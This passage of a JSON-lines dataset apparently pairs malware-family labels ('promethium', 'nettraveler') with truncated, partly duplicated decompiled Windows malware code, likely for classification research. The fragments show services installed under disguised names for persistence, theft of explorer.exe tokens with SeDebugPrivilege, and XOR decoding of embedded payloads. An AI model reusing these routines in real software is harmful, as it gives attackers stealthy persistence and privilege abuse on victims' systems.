\"netplviz\");\n    strcpy(DisplayName, \"Advanced User Accounts Control\");\n    v4 = CreateServiceA(result, ServiceName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0);\n    if ( v4 )\n    {\n      v6[0] = 6553665;\n      Info = v6;\n      v6[1] = 6357110;\n      v6[2] = 6488174;\n      v6[3] = 6553701;\n      v6[4] = 5570592;\n      v6[5] = 6619251;\n      v6[6] = 2097266;\n      v6[7] = 6488129;\n      v6[8] = 7274595;\n      v6[9] = 7209077;\n      v6[10] = 7536756;\n      v6[11] = 4390944;\n      v6[12] = 7209071;\n      v6[13] = 7471220;\n      v6[14] = 7077999;\n      v6[15] = 6619219;\n      v6[16] = 7733362;\n      v6[17] = 6488169;\n      v6[18] = 101;\n      ChangeServiceConfig2W(v4, 1u, &Info);\n      CloseServiceHandle(v4);\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n    else\n    {\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n  }\n  return result;\n}\nSC_HANDLE sub_401200()\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v1; // esi\n  SC_HANDLE v2; // eax\n  SC_HANDLE v3; // edi\n  CHAR ServiceName[12]; // [esp+4h] [ebp-10h] BYREF\n\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v1 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"netp"}
{"author": "promethium", "label": 8, "inputs": "HANDLE __thiscall sub_401000(void *this)\n{\n  HANDLE result; // eax\n  void *v2; // esi\n  BOOL (__stdcall *v3)(HANDLE, LPPROCESSENTRY32W); // edi\n  DWORD v4; // edi\n  HANDLE v5; // edi\n  LPVOID v6; // eax\n  BOOL (__stdcall *v7)(HANDLE); // edi\n  void *v8; // [esp+18h] [ebp-2D4h]\n  HANDLE phNewToken; // [esp+2Ch] [ebp-2C0h] BYREF\n  LPVOID Environment; // [esp+30h] [ebp-2BCh] BYREF\n  HANDLE TokenHandle; // [esp+34h] [ebp-2B8h] BYREF\n  HANDLE phToken; // [esp+38h] [ebp-2B4h] BYREF\n  HANDLE hObject[4]; // [esp+3Ch] [ebp-2B0h] BYREF\n  int v15[18]; // [esp+4Ch] [ebp-2A0h] BYREF\n  DWORD pSessionId; // [esp+94h] [ebp-258h] BYREF\n  ULONG SessionId; // [esp+98h] [ebp-254h] BYREF\n  struct _LUID Luid; // [esp+9Ch] [ebp-250h] BYREF\n  struct _TOKEN_PRIVILEGES NewState; // [esp+A4h] [ebp-248h] BYREF\n  PROCESSENTRY32W pe; // [esp+B4h] [ebp-238h] BYREF\n\n  TokenHandle = (HANDLE)-1;\n  phNewToken = (HANDLE)-1;\n  phToken = (HANDLE)-1;\n  Environment = 0;\n  SessionId = WTSGetActiveConsoleSessionId();\n  result = CreateToolhelp32Snapshot(2u, 0);\n  v2 = result;\n  if ( result != (HANDLE)-1 )\n  {\n    v3 = Process32NextW;\n    while ( 2 )\n    {\n      pe.dwSize = 556;\n      if ( Process32FirstW(v2, &pe) )\n      {\n        while ( 1 )\n        {\n          if ( !_wcsicmp(pe.szExeFile, L\"explorer.exe\") )\n          {\n            pSessionId = 0;\n            if ( ProcessIdToSessionId(pe.th32ProcessID, &pSessionId) )\n            {\n              if ( pSessionId == SessionId )\n                break;\n            }\n          }\n          if ( !v3(v2, &pe) )\n            goto LABEL_11;\n        }\n        v4 = pe.th32ProcessID;\n        if ( pe.th32ProcessID )\n        {\n          WTSQueryUserToken(SessionId, &phToken);\n          memset(v15, 0, 0x44u);\n          v15[0] = 68;\n          v15[2] = (int)L\"winsta0\\\\default\";\n          *(_OWORD *)hObject = 0i64;\n          v5 = OpenProcess(0x2000000u, 0, v4);\n          if ( v5 )\n          {\n            if ( OpenProcessToken(v5, 0x201EBu, &TokenHandle) )\n            {\n              if ( LookupPrivilegeValueW(0, L\"SeDebugPri"}
{"author": "promethium", "label": 8, "inputs": "HANDLE __thiscall sub_401000(void *this)\n{\n  HANDLE result; // eax\n  void *v2; // esi\n  BOOL (__stdcall *v3)(HANDLE, LPPROCESSENTRY32W); // edi\n  DWORD v4; // edi\n  HANDLE v5; // edi\n  LPVOID v6; // eax\n  BOOL (__stdcall *v7)(HANDLE); // edi\n  void *v8; // [esp+18h] [ebp-2D4h]\n  HANDLE phNewToken; // [esp+2Ch] [ebp-2C0h] BYREF\n  LPVOID Environment; // [esp+30h] [ebp-2BCh] BYREF\n  HANDLE TokenHandle; // [esp+34h] [ebp-2B8h] BYREF\n  HANDLE phToken; // [esp+38h] [ebp-2B4h] BYREF\n  HANDLE hObject[4]; // [esp+3Ch] [ebp-2B0h] BYREF\n  int v15[18]; // [esp+4Ch] [ebp-2A0h] BYREF\n  DWORD pSessionId; // [esp+94h] [ebp-258h] BYREF\n  ULONG SessionId; // [esp+98h] [ebp-254h] BYREF\n  struct _LUID Luid; // [esp+9Ch] [ebp-250h] BYREF\n  struct _TOKEN_PRIVILEGES NewState; // [esp+A4h] [ebp-248h] BYREF\n  PROCESSENTRY32W pe; // [esp+B4h] [ebp-238h] BYREF\n\n  TokenHandle = (HANDLE)-1;\n  phNewToken = (HANDLE)-1;\n  phToken = (HANDLE)-1;\n  Environment = 0;\n  SessionId = WTSGetActiveConsoleSessionId();\n  result = CreateToolhelp32Snapshot(2u, 0);\n  v2 = result;\n  if ( result != (HANDLE)-1 )\n  {\n    v3 = Process32NextW;\n    while ( 2 )\n    {\n      pe.dwSize = 556;\n      if ( Process32FirstW(v2, &pe) )\n      {\n        while ( 1 )\n        {\n          if ( !_wcsicmp(pe.szExeFile, L\"explorer.exe\") )\n          {\n            pSessionId = 0;\n            if ( ProcessIdToSessionId(pe.th32ProcessID, &pSessionId) )\n            {\n              if ( pSessionId == SessionId )\n                break;\n            }\n          }\n          if ( !v3(v2, &pe) )\n            goto LABEL_11;\n        }\n        v4 = pe.th32ProcessID;\n        if ( pe.th32ProcessID )\n        {\n          WTSQueryUserToken(SessionId, &phToken);\n          memset(v15, 0, 0x44u);\n          v15[0] = 68;\n          v15[2] = (int)L\"winsta0\\\\default\";\n          *(_OWORD *)hObject = 0i64;\n          v5 = OpenProcess(0x2000000u, 0, v4);\n          if ( v5 )\n          {\n            if ( OpenProcessToken(v5, 0x201EBu, &TokenHandle) )\n            {\n              if ( LookupPrivilegeValueW(0, L\"SeDebugPri"}
{"author": "promethium", "label": 8, "inputs": "int __usercall sub_401000@<eax>(DWORD a1@<edx>, const void *a2@<ecx>, const CHAR *lpFileName)\n{\n  BOOL v3; // edi\n  HANDLE v5; // esi\n  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h] BYREF\n\n  v3 = 0;\n  v5 = CreateFileA(lpFileName, 0xC0000000, 0, 0, 1u, 0x80u, 0);\n  if ( GetLastError() == 80 )\n    return 1;\n  if ( v5 != (HANDLE)-1 )\n  {\n    v3 = WriteFile(v5, a2, a1, &NumberOfBytesWritten, 0);\n    CloseHandle(v5);\n  }\n  return v3;\n}\nSC_HANDLE __thiscall sub_401090(LPCSTR lpBinaryPathName)\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v3; // edi\n  SC_HANDLE v4; // esi\n  int *Info; // [esp+8h] [ebp-80h] BYREF\n  int v6[19]; // [esp+Ch] [ebp-7Ch] BYREF\n  CHAR DisplayName[32]; // [esp+58h] [ebp-30h] BYREF\n  CHAR ServiceName[12]; // [esp+78h] [ebp-10h] BYREF\n\n  Info = 0;\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v3 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"netplviz\");\n    strcpy(DisplayName, \"Advanced User Accounts Control\");\n    v4 = CreateServiceA(result, ServiceName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0);\n    if ( v4 )\n    {\n      v6[0] = 6553665;\n      Info = v6;\n      v6[1] = 6357110;\n      v6[2] = 6488174;\n      v6[3] = 6553701;\n      v6[4] = 5570592;\n      v6[5] = 6619251;\n      v6[6] = 2097266;\n      v6[7] = 6488129;\n      v6[8] = 7274595;\n      v6[9] = 7209077;\n      v6[10] = 7536756;\n      v6[11] = 4390944;\n      v6[12] = 7209071;\n      v6[13] = 7471220;\n      v6[14] = 7077999;\n      v6[15] = 6619219;\n      v6[16] = 7733362;\n      v6[17] = 6488169;\n      v6[18] = 101;\n      ChangeServiceConfig2W(v4, 1u, &Info);\n      CloseServiceHandle(v4);\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n    else\n    {\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n  }\n  return result;\n}\nSC_HANDLE sub_401200()\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v1; // esi\n  SC_HANDLE v2; // eax\n  SC_HANDLE v3; // edi\n  CHAR ServiceName[12]; // [esp+4h] [ebp-10h] BYREF\n\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v1 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"netp"}
{"author": "promethium", "label": 8, "inputs": "FARPROC sub_401000()\n{\n  int v0; // esi\n  int v1; // ecx\n  WCHAR *v2; // eax\n  int v3; // ecx\n  _BYTE *v4; // eax\n  int v5; // ecx\n  _BYTE *v6; // eax\n  _BYTE *v7; // eax\n  unsigned int v8; // eax\n  unsigned int v9; // eax\n  HMODULE v10; // edi\n  HMODULE v11; // eax\n  FARPROC result; // eax\n  DWORD VolumeSerialNumber; // [esp+8h] [ebp-240h] BYREF\n  CHAR v14[16]; // [esp+Ch] [ebp-23Ch] BYREF\n  CHAR v15[16]; // [esp+1Ch] [ebp-22Ch] BYREF\n  char v16[20]; // [esp+2Ch] [ebp-21Ch] BYREF\n  char v17[20]; // [esp+40h] [ebp-208h] BYREF\n  char v18[20]; // [esp+54h] [ebp-1F4h] BYREF\n  char v19[20]; // [esp+68h] [ebp-1E0h] BYREF\n  char v20[20]; // [esp+7Ch] [ebp-1CCh] BYREF\n  char v21[20]; // [esp+90h] [ebp-1B8h] BYREF\n  char v22[24]; // [esp+A4h] [ebp-1A4h] BYREF\n  char v23[28]; // [esp+BCh] [ebp-18Ch] BYREF\n  __int128 v24; // [esp+D8h] [ebp-170h] BYREF\n  __int16 v25; // [esp+E8h] [ebp-160h]\n  __int16 v26; // [esp+EAh] [ebp-15Eh]\n  __int16 v27; // [esp+ECh] [ebp-15Ch]\n  __int16 v28; // [esp+EEh] [ebp-15Ah]\n  __int16 v29; // [esp+F0h] [ebp-158h]\n  __int16 v30; // [esp+F2h] [ebp-156h]\n  __int16 v31; // [esp+F4h] [ebp-154h]\n  __int16 v32; // [esp+F6h] [ebp-152h]\n  __int16 v33; // [esp+F8h] [ebp-150h]\n  __int16 v34; // [esp+FAh] [ebp-14Eh]\n  __int16 v35; // [esp+FCh] [ebp-14Ch]\n  __int16 v36; // [esp+FEh] [ebp-14Ah]\n  __int16 v37; // [esp+100h] [ebp-148h]\n  __int16 v38; // [esp+102h] [ebp-146h]\n  __int16 v39; // [esp+104h] [ebp-144h]\n  __int16 v40; // [esp+106h] [ebp-142h]\n  __int16 v41; // [esp+108h] [ebp-140h]\n  __int16 v42; // [esp+10Ah] [ebp-13Eh]\n  __int16 v43; // [esp+10Ch] [ebp-13Ch]\n  __int16 v44; // [esp+10Eh] [ebp-13Ah]\n  __int16 v45; // [esp+110h] [ebp-138h]\n  __int16 v46; // [esp+112h] [ebp-136h]\n  __int16 v47; // [esp+114h] [ebp-134h]\n  __int16 v48; // [esp+116h] [ebp-132h]\n  __int16 v49; // [esp+118h] [ebp-130h]\n  __int16 v50; // [esp+11Ah] [ebp-12Eh]\n  __int16 v51; // [esp+11Ch] [ebp-12Ch]\n  __int16 v52; // [esp+11Eh] [ebp-12Ah]\n  __int16 v53; // [esp+120h] [ebp-128h]\n  __int16 v54; // [esp+122h] [ebp-126h]\n  __in"}
{"author": "promethium", "label": 8, "inputs": "int __usercall sub_401000@<eax>(const CHAR *a1@<edx>, _DWORD *a2, DWORD *a3)\n{\n  int v3; // esi\n  HMODULE v4; // eax\n  HRSRC v5; // eax\n  HRSRC v6; // ebx\n  HMODULE v7; // eax\n  HMODULE v8; // eax\n  HGLOBAL v9; // eax\n  LPVOID v10; // eax\n  HRSRC v13; // [esp-4h] [ebp-10h]\n\n  v3 = 0;\n  v4 = GetModuleHandleA(0);\n  v5 = FindResourceA(v4, (LPCSTR)0x65, a1);\n  v6 = v5;\n  if ( v5 )\n  {\n    v13 = v5;\n    v7 = GetModuleHandleA(0);\n    *a3 = SizeofResource(v7, v13);\n    v8 = GetModuleHandleA(0);\n    v9 = LoadResource(v8, v6);\n    if ( v9 )\n    {\n      v10 = LockResource(v9);\n      *a2 = v10;\n      if ( v10 )\n        v3 = 1;\n    }\n  }\n  return v3;\n}\nSC_HANDLE sub_40105B()\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v1; // esi\n  SC_HANDLE v2; // eax\n  SC_HANDLE v3; // edi\n  CHAR ServiceName[12]; // [esp+8h] [ebp-10h] BYREF\n\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v1 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"svchosts32\");\n    v2 = OpenServiceA(result, ServiceName, 0xF01FFu);\n    v3 = v2;\n    if ( v2 )\n    {\n      StartServiceA(v2, 0, 0);\n      CloseServiceHandle(v3);\n    }\n    result = (SC_HANDLE)CloseServiceHandle(v1);\n  }\n  return result;\n}\nint __fastcall sub_4010D8(int a1, unsigned int a2)\n{\n  int v2; // edi\n  unsigned int v3; // esi\n\n  v2 = 0;\n  v3 = 0;\n  if ( a2 )\n  {\n    while ( v3 != 300 )\n    {\n      *(_BYTE *)(v3 + a1) ^= byte_413A40[v3 % 0x4B] ^ byte_413A90[v3 % 0x4B];\n      if ( ++v3 >= a2 )\n        return v2;\n    }\n    v2 = 300;\n  }\n  return v2;\n}\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  HWND v3; // eax\n  HMODULE v4; // eax\n  DWORD v5; // eax\n  DWORD v6; // eax\n  size_t v7; // esi\n  void *v8; // ebx\n  unsigned int v9; // edi\n  unsigned int v10; // edi\n  size_t *v11; // esi\n  void (__stdcall *v12)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // ebx\n  int v13; // ecx\n  CHAR *v14; // eax\n  unsigned int v15; // eax\n  HMODULE v16; // eax\n  FARPROC v17; // eax\n  FARPROC v19; // [esp+50h] [ebp-268h]\n  char *v20; // [esp+50h] [ebp-268h]\n  DWO"}
{"author": "promethium", "label": 8, "inputs": "HANDLE __usercall sub_401000@<eax>(int a1@<ecx>, int a2@<esi>)\n{\n  int v2; // ebx\n  HANDLE result; // eax\n  void *v4; // edi\n  HMODULE v5; // eax\n  HMODULE v6; // eax\n  HMODULE v7; // eax\n  HMODULE v8; // eax\n  HMODULE v9; // eax\n  LPVOID v10; // eax\n  HANDLE v12; // [esp+Ch] [ebp-2D8h]\n  int v13[17]; // [esp+10h] [ebp-2D4h] BYREF\n  HANDLE hObject; // [esp+54h] [ebp-290h]\n  HANDLE v15; // [esp+58h] [ebp-28Ch]\n  int v16; // [esp+5Ch] [ebp-288h]\n  int v17; // [esp+60h] [ebp-284h]\n  HANDLE v18; // [esp+64h] [ebp-280h] BYREF\n  HANDLE hExistingToken; // [esp+68h] [ebp-27Ch] BYREF\n  LPVOID lpEnvironment; // [esp+6Ch] [ebp-278h] BYREF\n  HANDLE phNewToken; // [esp+70h] [ebp-274h] BYREF\n  PROCESSENTRY32W pe; // [esp+74h] [ebp-270h] BYREF\n  int v23; // [esp+2A0h] [ebp-44h] BYREF\n  struct _LUID v24; // [esp+2A4h] [ebp-40h]\n  int v25; // [esp+2ACh] [ebp-38h]\n  struct _LUID Luid; // [esp+2B0h] [ebp-34h] BYREF\n  DWORD TokenInformation; // [esp+2B8h] [ebp-2Ch] BYREF\n  DWORD pSessionId; // [esp+2BCh] [ebp-28h] BYREF\n  CHAR ProcName[20]; // [esp+2C0h] [ebp-24h] BYREF\n  CHAR LibFileName[12]; // [esp+2D4h] [ebp-10h] BYREF\n\n  lpEnvironment = 0;\n  v2 = -1;\n  hExistingToken = (HANDLE)-1;\n  phNewToken = (HANDLE)-1;\n  v18 = (HANDLE)-1;\n  TokenInformation = WTSGetActiveConsoleSessionId();\n  result = CreateToolhelp32Snapshot(2u, 0);\n  v4 = result;\n  v12 = result;\n  if ( result != (HANDLE)-1 )\n  {\n    while ( 2 )\n    {\n      pe.dwSize = 556;\n      if ( Process32FirstW(v4, &pe) )\n      {\n        while ( 1 )\n        {\n          if ( !_wcsicmp(pe.szExeFile, L\"explorer.exe\") )\n          {\n            pSessionId = 0;\n            if ( ProcessIdToSessionId(pe.th32ProcessID, &pSessionId) )\n            {\n              if ( pSessionId == TokenInformation )\n                break;\n            }\n          }\n          if ( !Process32NextW(v4, &pe) )\n            goto LABEL_9;\n        }\n        pSessionId = pe.th32ProcessID;\n        if ( !pe.th32ProcessID )\n        {\nLABEL_9:\n          CloseHandle(v4);\n          Sleep(0x1838u);\n          result = CreateTo"}
{"author": "promethium", "label": 8, "inputs": "FARPROC sub_401000()\n{\n  int v0; // esi\n  int v1; // ecx\n  WCHAR *v2; // eax\n  int v3; // ecx\n  _BYTE *v4; // eax\n  int v5; // ecx\n  _BYTE *v6; // eax\n  _BYTE *v7; // eax\n  unsigned int v8; // eax\n  unsigned int v9; // eax\n  HMODULE v10; // edi\n  HMODULE v11; // eax\n  FARPROC result; // eax\n  DWORD VolumeSerialNumber; // [esp+8h] [ebp-240h] BYREF\n  CHAR v14[16]; // [esp+Ch] [ebp-23Ch] BYREF\n  CHAR v15[16]; // [esp+1Ch] [ebp-22Ch] BYREF\n  char v16[20]; // [esp+2Ch] [ebp-21Ch] BYREF\n  char v17[20]; // [esp+40h] [ebp-208h] BYREF\n  char v18[20]; // [esp+54h] [ebp-1F4h] BYREF\n  char v19[20]; // [esp+68h] [ebp-1E0h] BYREF\n  char v20[20]; // [esp+7Ch] [ebp-1CCh] BYREF\n  char v21[20]; // [esp+90h] [ebp-1B8h] BYREF\n  char v22[24]; // [esp+A4h] [ebp-1A4h] BYREF\n  char v23[28]; // [esp+BCh] [ebp-18Ch] BYREF\n  __int128 v24; // [esp+D8h] [ebp-170h] BYREF\n  __int16 v25; // [esp+E8h] [ebp-160h]\n  __int16 v26; // [esp+EAh] [ebp-15Eh]\n  __int16 v27; // [esp+ECh] [ebp-15Ch]\n  __int16 v28; // [esp+EEh] [ebp-15Ah]\n  __int16 v29; // [esp+F0h] [ebp-158h]\n  __int16 v30; // [esp+F2h] [ebp-156h]\n  __int16 v31; // [esp+F4h] [ebp-154h]\n  __int16 v32; // [esp+F6h] [ebp-152h]\n  __int16 v33; // [esp+F8h] [ebp-150h]\n  __int16 v34; // [esp+FAh] [ebp-14Eh]\n  __int16 v35; // [esp+FCh] [ebp-14Ch]\n  __int16 v36; // [esp+FEh] [ebp-14Ah]\n  __int16 v37; // [esp+100h] [ebp-148h]\n  __int16 v38; // [esp+102h] [ebp-146h]\n  __int16 v39; // [esp+104h] [ebp-144h]\n  __int16 v40; // [esp+106h] [ebp-142h]\n  __int16 v41; // [esp+108h] [ebp-140h]\n  __int16 v42; // [esp+10Ah] [ebp-13Eh]\n  __int16 v43; // [esp+10Ch] [ebp-13Ch]\n  __int16 v44; // [esp+10Eh] [ebp-13Ah]\n  __int16 v45; // [esp+110h] [ebp-138h]\n  __int16 v46; // [esp+112h] [ebp-136h]\n  __int16 v47; // [esp+114h] [ebp-134h]\n  __int16 v48; // [esp+116h] [ebp-132h]\n  __int16 v49; // [esp+118h] [ebp-130h]\n  __int16 v50; // [esp+11Ah] [ebp-12Eh]\n  __int16 v51; // [esp+11Ch] [ebp-12Ch]\n  __int16 v52; // [esp+11Eh] [ebp-12Ah]\n  __int16 v53; // [esp+120h] [ebp-128h]\n  __int16 v54; // [esp+122h] [ebp-126h]\n  __in"}
{"author": "promethium", "label": 8, "inputs": "int __usercall sub_401000@<eax>(DWORD a1@<edx>, const void *a2@<ecx>, const CHAR *lpFileName)\n{\n  BOOL v3; // edi\n  HANDLE v5; // esi\n  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h] BYREF\n\n  v3 = 0;\n  v5 = CreateFileA(lpFileName, 0xC0000000, 0, 0, 1u, 0x80u, 0);\n  if ( GetLastError() == 80 )\n    return 1;\n  if ( v5 != (HANDLE)-1 )\n  {\n    v3 = WriteFile(v5, a2, a1, &NumberOfBytesWritten, 0);\n    CloseHandle(v5);\n  }\n  return v3;\n}\nSC_HANDLE __thiscall sub_401090(LPCSTR lpBinaryPathName)\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v3; // edi\n  SC_HANDLE v4; // esi\n  int *Info; // [esp+8h] [ebp-74h] BYREF\n  CHAR DisplayName[36]; // [esp+Ch] [ebp-70h] BYREF\n  int v7[14]; // [esp+30h] [ebp-4Ch] BYREF\n  __int16 v8; // [esp+68h] [ebp-14h]\n  CHAR ServiceName[12]; // [esp+6Ch] [ebp-10h] BYREF\n\n  Info = 0;\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v3 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"NetProj32\");\n    strcpy(DisplayName, \"Network Projector Connect Service\");\n    v4 = CreateServiceA(result, ServiceName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0);\n    if ( v4 )\n    {\n      v7[0] = 6619219;\n      v8 = 0;\n      Info = v7;\n      v7[1] = 7733362;\n      v7[2] = 6488169;\n      v7[3] = 2097253;\n      v7[4] = 7274598;\n      v7[5] = 5111922;\n      v7[6] = 7602277;\n      v7[7] = 7274615;\n      v7[8] = 7012466;\n      v7[9] = 5242912;\n      v7[10] = 7274610;\n      v7[11] = 6619242;\n      v7[12] = 7602275;\n      v7[13] = 7471215;\n      ChangeServiceConfig2W(v4, 1u, &Info);\n      CloseServiceHandle(v4);\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n    else\n    {\n      result = (SC_HANDLE)CloseServiceHandle(v3);\n    }\n  }\n  return result;\n}\nSC_HANDLE sub_4011D0()\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v1; // esi\n  SC_HANDLE v2; // eax\n  SC_HANDLE v3; // edi\n  CHAR ServiceName[12]; // [esp+4h] [ebp-10h] BYREF\n\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v1 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, \"NetProj32\");\n    v2 = OpenServiceA(result, ServiceName, 0xF01FFu)"}
{"author": "nettraveler", "label": 9, "inputs": "int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  HANDLE v4; // esi\n  DWORD v5; // eax\n  CHAR *v6; // esi\n  CHAR FileName[260]; // [esp+8h] [ebp-208h] BYREF\n  CHAR Buffer[260]; // [esp+10Ch] [ebp-104h] BYREF\n\n  v4 = CreateMutexA(0, 1, Name);\n  v5 = GetLastError();\n  if ( v5 != 183 && v5 != 5 )\n  {\n    ReleaseMutex(v4);\n    CloseHandle(v4);\n    if ( sub_4016B2() )\n    {\n      SetUnhandledExceptionFilter(TopLevelExceptionFilter);\n      v6 = (CHAR *)sub_4010C9();\n      DeleteFileA(::FileName);\n      if ( v6 )\n      {\n        sub_401603(v6);\n        GetWindowsDirectoryA(Buffer, 0x104u);\n        wsprintfA(FileName, \"%s\\\\system\\\\config_t.dat\", Buffer);\n        WritePrivateProfileStringA(AppName, KeyName, v6, FileName);\n        sub_401B4D(v6);\n      }\n    }\n  }\n  return 0;\n}\nchar *sub_4010C9()\n{\n  DWORD v0; // esi\n  const char *i; // esi\n  HMODULE v2; // eax\n  SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR); // eax\n  int v5; // eax\n  DWORD v6; // edi\n  DWORD v7; // edi\n  FILE *v8; // eax\n  size_t v9; // eax\n  HMODULE v10; // eax\n  UINT (__stdcall *WinExec)(LPCSTR, UINT); // eax\n  HANDLE v12; // edi\n  FARPROC v13; // eax\n  HMODULE v14; // eax\n  void (__stdcall *Sleep)(DWORD); // eax\n  FILE *v16; // [esp-4h] [ebp-E84h]\n  int v17; // [esp+0h] [ebp-E80h] BYREF\n  char v18[512]; // [esp+Ch] [ebp-E74h] BYREF\n  BYTE Data[1024]; // [esp+20Ch] [ebp-C74h] BYREF\n  CHAR SubKey[500]; // [esp+60Ch] [ebp-874h] BYREF\n  char Destination[10]; // [esp+800h] [ebp-680h] BYREF\n  char v22[1012]; // [esp+80Ah] [ebp-676h] BYREF\n  __int16 v23; // [esp+BFEh] [ebp-282h]\n  CHAR Buffer[260]; // [esp+C00h] [ebp-280h] BYREF\n  CHAR FileName[260]; // [esp+D04h] [ebp-17Ch] BYREF\n  DWORD Type; // [esp+E08h] [ebp-78h] BYREF\n  CHAR ProcName[16]; // [esp+E0Ch] [ebp-74h] BYREF\n  SYSTEMTIME SystemTime; // [esp+E1Ch] [ebp-64h] BYREF\n  void *v29; // [esp+E2Ch] [ebp-54h] BYREF\n  void *v30; // [esp+E30h] [ebp-50h] BYREF\n"}
{"author": "nettraveler", "label": 9, "inputs": "int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  HANDLE v4; // esi\n  DWORD v5; // eax\n  CHAR *v6; // edi\n  CHAR FileName[260]; // [esp+Ch] [ebp-208h] BYREF\n  CHAR Buffer[260]; // [esp+110h] [ebp-104h] BYREF\n\n  v4 = CreateMutexA(0, 1, Name);\n  v5 = GetLastError();\n  if ( v5 == 183 )\n    return 0;\n  if ( v5 == 5 )\n    return 0;\n  ReleaseMutex(v4);\n  CloseHandle(v4);\n  if ( !sub_401802() )\n    return 0;\n  SetUnhandledExceptionFilter(TopLevelExceptionFilter);\n  v6 = (CHAR *)sub_40113A();\n  Sleep(0xAu);\n  DeleteFileA(::FileName);\n  if ( v6 )\n  {\n    sub_401752(v6);\n    GetWindowsDirectoryA(Buffer, 0x104u);\n    wsprintfA(FileName, \"%s\\\\system\\\\config_t.dat\", Buffer);\n    Sleep(0xAu);\n    WritePrivateProfileStringA(AppName, KeyName, v6, FileName);\n    operator delete(v6);\n  }\n  return 0;\n}\nvoid __cdecl sub_4010E1(int a1, int a2)\n{\n  int v2; // esi\n  char v3; // al\n  char v4; // cl\n  char v5[4]; // [esp+4h] [ebp-4h] BYREF\n\n  v2 = 0;\n  qmemcpy(v5, \"jwy7\", sizeof(v5));\n  if ( a2 > 0 )\n  {\n    do\n    {\n      v3 = (v2 % a2) ^ ((unsigned __int16)(v2 % a2) >> 8) ^ ((unsigned int)(v2 % a2) >> 16) ^ v5[v2 & 3];\n      v4 = *(_BYTE *)(v2 + a1);\n      if ( v4 )\n      {\n        if ( v4 != v3 )\n          *(_BYTE *)(v2 + a1) = v3 ^ v4;\n      }\n      ++v2;\n    }\n    while ( v2 < a2 );\n  }\n}\nchar *sub_40113A()\n{\n  void *v0; // esp\n  DWORD v1; // esi\n  const char *i; // esi\n  HMODULE v3; // eax\n  SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR); // eax\n  int v6; // eax\n  DWORD v7; // esi\n  FILE *v8; // eax\n  size_t v9; // eax\n  HMODULE v10; // eax\n  UINT (__stdcall *WinExec)(LPCSTR, UINT); // eax\n  HMODULE v12; // eax\n  BOOL (__stdcall *SetFileTime)(HANDLE, const FILETIME *, const FILETIME *, const FILETIME *); // eax\n  HMODULE v14; // edi\n  FARPROC v15; // eax\n  HMODULE v16; // eax\n  void (__stdcall *Sleep)(DWORD); // eax\n  HMODULE v18; // eax\n  void (__stdcall *v19)(DWORD); // eax\n  FILE *v2"}
{"author": "nettraveler", "label": 9, "inputs": "BOOL sub_401000()\n{\n  BOOL result; // eax\n  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-A0h] BYREF\n\n  memset(&VersionInformation, 0, sizeof(VersionInformation));\n  VersionInformation.dwOSVersionInfoSize = 148;\n  if ( GetVersionExA(&VersionInformation) )\n    result = VersionInformation.dwMajorVersion == 6;\n  else\n    result = 1;\n  return result;\n}\nint sub_401070()\n{\n  HMODULE v0; // eax\n  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-2Ch] BYREF\n  int v3; // [esp+24h] [ebp-8h]\n  void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO); // [esp+28h] [ebp-4h]\n\n  v3 = 0;\n  SystemInfo.dwOemId = 0;\n  SystemInfo.dwPageSize = 0;\n  SystemInfo.lpMinimumApplicationAddress = 0;\n  SystemInfo.lpMaximumApplicationAddress = 0;\n  SystemInfo.dwActiveProcessorMask = 0;\n  SystemInfo.dwNumberOfProcessors = 0;\n  SystemInfo.dwProcessorType = 0;\n  SystemInfo.dwAllocationGranularity = 0;\n  *(_DWORD *)&SystemInfo.wProcessorLevel = 0;\n  v0 = GetModuleHandleA(\"kernel32.dll\");\n  GetNativeSystemInfo = (void (__stdcall *)(LPSYSTEM_INFO))GetProcAddress(v0, \"GetNativeSystemInfo\");\n  if ( GetNativeSystemInfo )\n    GetNativeSystemInfo(&SystemInfo);\n  else\n    GetSystemInfo(&SystemInfo);\n  if ( SystemInfo.wProcessorArchitecture == 9 )\n    